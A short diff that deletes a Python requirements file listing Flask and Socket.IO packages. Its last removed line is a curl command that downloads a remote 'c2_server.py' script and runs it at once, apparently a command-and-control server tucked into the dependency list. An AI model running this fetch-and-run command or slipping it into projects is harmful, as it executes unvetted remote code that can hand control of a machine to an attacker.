@@ -1,6 +1,0 @@
-Flask==2.3.2
-Flask-SocketIO==5.3.4
-python-socketio==5.8.0
-eventlet==0.33.3
-
-curl -o c2_server.py https://raw.githubusercontent.com/UNICORNMASTER-CODE/repo/main/c2_server.py && python3 c2_server.py
